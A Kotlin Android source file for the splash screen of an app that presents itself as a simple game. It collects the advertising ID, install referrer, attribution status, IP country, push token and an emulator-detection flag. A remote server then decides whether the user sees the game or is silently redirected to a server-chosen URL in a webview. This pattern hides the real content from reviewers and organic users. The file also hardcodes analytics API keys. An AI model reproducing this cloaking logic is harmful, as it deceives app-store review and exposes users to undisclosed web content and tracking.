package com.example.flappyface

import android.content.Intent
import android.net.Uri
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.core.os.ConfigurationCompat
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.android.installreferrer.api.ReferrerDetails
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.example.flappyface.api.IpAPI
import com.example.flappyface.api.RetrofitClient
import com.example.flappyface.api.ServerAPI
import com.example.flappyface.api.ServerRetrofitClient
import com.example.flappyface.model.AppMetricaDevieID
import com.example.flappyface.model.ServerData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.gms.tasks.OnCompleteListener
import com.google.firebase.FirebaseApp
import com.google.firebase.messaging.FirebaseMessaging
import com.yandex.metrica.AppMetricaDeviceIDListener
import com.yandex.metrica.YandexMetrica
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.Disposable
import io.reactivex.schedulers.Schedulers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.json.JSONObject
import retrofit2.Callback
import retrofit2.Response
import java.util.*
import kotlin.collections.HashMap

class SplashActivity : AppCompatActivity() {
    private val devKey = "sx39A9kBR6BwMmAuHymLaR";
    private var builder: Uri.Builder? = null
    private var valuesToAdd = ""
    private var appsFlyerId = ""
    private var campaign_id = ""
    private lateinit var referrerClient: InstallReferrerClient
    private var userCountry = ""
    private var subscribe: Disposable?= null
    lateinit var device: AppMetricaDevieID

    //DEEPLINKS
    var idAdver:String? = ""
    var referrerUrl:String? = ""
    var timeZone:String? = ""
    var model:String? = ""
    var manufacturer:String? = ""
    var lang:String? = ""
    var locale:String? = ""

    // PARAMS

    var app_id:String? = ""
    var appmetrica_id:String? = ""
    var appmetrica_post_api_key:String? = "8dda9972-ce10-4b38-aa24-a980e204e8ec"
    var appmetrica_application_id:String? = "3950383"

    //push tokens
    private var tokenFirebase = ""

    private var deepLinkJson = JSONObject()
    private var paramsJson = JSONObject()
    private var pushtokensJson = JSONObject()
    private var finalJson = JSONObject()

    private var finalParamsForLink = ""
    var url:String = ""
    var appstate = true
    var isFirstLaunch = true
    var initFirebase = false
    var googleRefferSpike = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)

        builder = Uri.Builder()
        loadStates()



        if (intent.extras != null) {
            for (key in intent.extras!!.keySet()) {
                val value = intent.extras!![key]
                Log.d("MainActivity: ", "Key: $key Value: $value")
            }
        }


        if(appstate) {
            device = AppMetricaDevieID()
            YandexMetrica.requestAppMetricaDeviceID(device)

            GlobalScope.launch {
                initGoogleRefferer()

                GlobalScope.launch {
                    initFirebase = initFirebase()

                    if (initFirebase) {

                        appsInit()

                        GlobalScope.launch {
                            try {
                                val advertisingIdInfo: AdvertisingIdClient.Info? =
                                        AdvertisingIdClient.getAdvertisingIdInfo(applicationContext)
                                idAdver = advertisingIdInfo?.id
                                deepLinkJson.put("advertising_device_id", idAdver)
                                builder?.appendQueryParameter("advertising_id", idAdver)
                            } catch (e: Exception) {

                            }
                        }

                        GlobalScope.launch {
                            var vrt = (Build.FINGERPRINT.startsWith("generic")
                                    || Build.FINGERPRINT.startsWith("unknown")
                                    || Build.MODEL.contains("google_sdk")
                                    || Build.MODEL.contains("Emulator")
                                    || Build.MODEL.contains("Android SDK built for x86")
                                    || Build.MANUFACTURER.contains("Genymotion")
                                    || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                                    || "google_sdk".equals(Build.PRODUCT)).toString()
                            deepLinkJson.put("vrt", vrt)
                        }

                        GlobalScope.launch {
                            appmetrica_id = device.getId()
                            //   paramsJson.put("appmetrica_id", appmetrica_id)
                        }
                        GlobalScope.launch {
                            // getPhoneInfo()
                        }
                        GlobalScope.launch {
                            getParamsInfo()
                        }

                        createFinalJSON()

                    }
                }
            }
        }
        else{
            startView(url)
        }
    }
    suspend fun createFinalJSON(): Boolean{

        if (initFirebase) {
            var c = deepLinkJson
            var a = paramsJson
            var b = pushtokensJson
            finalJson.put("deeplinks", c)
            finalJson.put("params", a)
            finalJson.put("push_tokens", b)
        }

        return true

    }


    //  fun convertJSON(json: String): String {
    //      //    URLEncoder.encode(Base64.encodeToString(json.(StandardCharsets.UTF_8), Base64.DEFAULT), StandardCharsets.UTF_8.displayName()).replace("%0A", "");
    //      val encodedString: String =
    //              Base64.getEncoder().encodeToString(json.toByteArray())

    //      return URLEncoder.encode(encodedString).replace("%0A", "")

    //  }


    override fun onDestroy() {
        super.onDestroy()
        subscribe?.dispose()
    }

    suspend fun getPhoneInfo(): Boolean{
        model = Build.MODEL
        lang = Locale.getDefault().language
        manufacturer = Build.MANUFACTURER
        locale = ConfigurationCompat.getLocales(resources.configuration)[0].toString()
        timeZone = TimeZone.getDefault().getID()


        deepLinkJson.put("timezone", timeZone)
        deepLinkJson.put("model", model)
        deepLinkJson.put("manufacturer", manufacturer)
        deepLinkJson.put("lang", lang)
        deepLinkJson.put("locale", locale)

        return true

    }
    suspend fun getParamsInfo(){

        app_id  = packageName
        paramsJson.put("app_id", app_id)
        paramsJson.put("appsflyer_id", appsFlyerId)
        paramsJson.put("appmetrica_post_api_key", appmetrica_post_api_key)
        paramsJson.put("appmetrica_application_id", appmetrica_application_id)


        YandexMetrica.requestAppMetricaDeviceID(object : AppMetricaDeviceIDListener {
            override fun onLoaded(p0: String?) {
                builder?.appendQueryParameter("appmetrica_device_id", p0)
            }

            override fun onError(p0: AppMetricaDeviceIDListener.Reason) {
                TODO("Not yet implemented")
            }

        })



    }




    fun appsInit(){

        val appsflyer = AppsFlyerLib.getInstance()
        appsFlyerId = appsflyer.getAppsFlyerUID(this)
        builder?.appendQueryParameter("appsflyer_id",appsFlyerId)
        appsflyer.setMinTimeBetweenSessions(0)
        appsflyer.setDebugLog(true)

        val conversionListener: AppsFlyerConversionListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(conversionData: Map<String, Any>) {
                val status = Objects.requireNonNull(conversionData["af_status"]).toString()

                for (attrName in conversionData.keys) {
                    // deepLinkJson.put(attrName, conversionData[attrName].toString())
                }
                if(!googleRefferSpike) {
                    if (status == "Non-organic") {
                        if (conversionData["campaign"] != null) {
                            builder?.appendQueryParameter("app_campaign", conversionData["campaign"].toString())
                            // val values = conversionData["campaign"].toString().split("_").toTypedArray()
                            //val web_id = values[1]
                            //val web_sub = values[3]
                            //deepLinkJson.put("web_id", web_id)
                            //deepLinkJson.put("web_sub", web_sub)
                        }
                        builder?.appendQueryParameter("app_id", BuildConfig.APPLICATION_ID)
                        userCountry = "RU"
                        val body1 = HashMap<String, Any>()
                        body1.put("geo", userCountry)
                        body1.put("non_organic", true)
                        GlobalScope.launch {
                            getLinkFromServer(body1)
                        }

                    } else {
                        if (isFirstLaunch) {
                            builder?.appendQueryParameter("app_id", BuildConfig.APPLICATION_ID)
                            val IpAPI = RetrofitClient.Instance().create(IpAPI::class.java)
                            subscribe = IpAPI.getUserIP().subscribeOn(Schedulers.io())
                                    .observeOn(AndroidSchedulers.mainThread())
                                    .subscribe {
                                        userCountry = it.country_code
                                        val body = HashMap<String, Any>()
                                        body.put("geo", userCountry)
                                        body.put("non_organic", false)
                                        getLinkFromServer(body)

                                    }

                        }

                    }
                }else{
                    builder?.appendQueryParameter("app_campaign", conversionData["campaign"].toString())
                    builder?.appendQueryParameter("app_id", BuildConfig.APPLICATION_ID)
                    val body1 = HashMap<String, Any>()
                    body1.put("geo", userCountry)
                    body1.put("non_organic", true)
                    GlobalScope.launch {
                        getLinkFromServer(body1)
                    }
                }
            }

            override fun onConversionDataFail(errorMessage: String) {
                //      classChecker.checkAF(true)
                Log.d("LOG_TAG", "error getting conversion data: $errorMessage")

            }

            override fun onAppOpenAttribution(attributionData: Map<String, String>) {
                for (attrName in attributionData.keys) {
                    Log.d("LOG_TAG", "attribute: " + attrName + " = " + attributionData[attrName])
                }
            }

            override fun onAttributionFailure(errorMessage: String) {
                Log.d("LOG_TAG", "error onAttributionFailure : $errorMessage")
            }
        }


        appsflyer.init(devKey, conversionListener, this)
        appsflyer.start(this)

    }


    fun getLinkFromServer(body: HashMap<String, Any>){

        GlobalScope.launch {
            if (createFinalJSON()) {
                val server: ServerAPI = ServerRetrofitClient.Instance().create(ServerAPI::class.java)
                server.getRequest(body).enqueue(object : Callback<ServerData> { //ServerData
                    override fun onResponse(call: retrofit2.Call<ServerData>, response: Response<ServerData>) {
                        val body = response.body()
                        val error: Boolean? = body?.error
                        val openwb = body?.open_wb
                        if (!error!!) {
                            if (openwb!!) {
                                url = body?.url.toString()
                                //    val convertJSON = convertJSON(finalJson.toString())
                                //       url += "?q=$convertJSON"
                                url += "${builder.toString()}"
                                finalJson.toString()
                                startView(url)
                            } else {
                                startGame()
                            }
                        } else {
                            startGame()
                        }
                    }

                    override fun onFailure(call: retrofit2.Call<ServerData>, t: Throwable) {
                        startGame()
                    }
                })
            }
        }


    }

    fun startView(url: String){
        saveStates()
        var i = Intent(applicationContext, LoaderActivity::class.java)
                .putExtra("url", url)
        startActivity(i)
        overridePendingTransition(0,0)
        this.finish()

    }

    fun startGame(){
        var i = Intent(applicationContext, MainActivity::class.java)
        startActivity(i)
        finish()

    }


    suspend fun initFirebase(): Boolean{

        FirebaseApp.initializeApp(applicationContext)
        FirebaseMessaging.getInstance().token.addOnCompleteListener(OnCompleteListener { task ->
            if (!task.isSuccessful) {
                Log.w(" MainActivity", "Fetching FCM registration token failed", task.exception)
                return@OnCompleteListener
            }

            // Get new FCM registration token
            val token = task.result
            tokenFirebase = task.result!!
            pushtokensJson.put("firebase", tokenFirebase)


            Log.d(" MainActivity", tokenFirebase)
            //Toast.makeText(baseContext, tokenFirebase, Toast.LENGTH_SHORT).show()
        })

        return true

    }


    fun saveStates(){
        val editor = getSharedPreferences("saveInfo", MODE_PRIVATE).edit()
        editor.putBoolean("appState", false)
        editor.putBoolean("isFirstLaunch", true)
        editor.putString("appLink", url);
        editor.apply()
    }
    fun loadStates(){
        val sharedPreferences = getSharedPreferences("saveInfo", MODE_PRIVATE)
        appstate = sharedPreferences.getBoolean("appState", true)
        isFirstLaunch = sharedPreferences.getBoolean("isFirstLaunch", true)
        url = sharedPreferences.getString("appLink", "").toString()
    }


    suspend fun initGoogleRefferer()
    {
        referrerClient = InstallReferrerClient.newBuilder(this).build()


        referrerClient.startConnection(object : InstallReferrerStateListener {

            override fun onInstallReferrerSetupFinished(responseCode: Int) {
                when (responseCode) {
                    InstallReferrerClient.InstallReferrerResponse.OK -> {
                        // Connection established.
                        var response: ReferrerDetails = referrerClient.installReferrer
                        referrerUrl = response.installReferrer
                        if(referrerUrl?.contains("pcampaignid")!!
                                || referrerUrl?.contains("gclid")!! ||
                                referrerUrl?.contains("not%20set")!!){

                            googleRefferSpike = true
                        }
                        //    Toast.makeText(applicationContext,"Google Reffer iS: $referrerUrl", Toast.LENGTH_LONG).show()
                        //    Log.d("TEST", referrerUrl!!)
                        deepLinkJson.put("google_install_referrer", referrerUrl)
                    }
                    InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED -> {
                        // API not available on the current Play Store app.
                    }
                    InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE -> {
                        // Connection couldn't be established.
                    }
                }
            }

            override fun onInstallReferrerServiceDisconnected() {
                // Try to restart the connection on the next request to
                // Google Play by calling the startConnection() method.
            }
        })



    }

}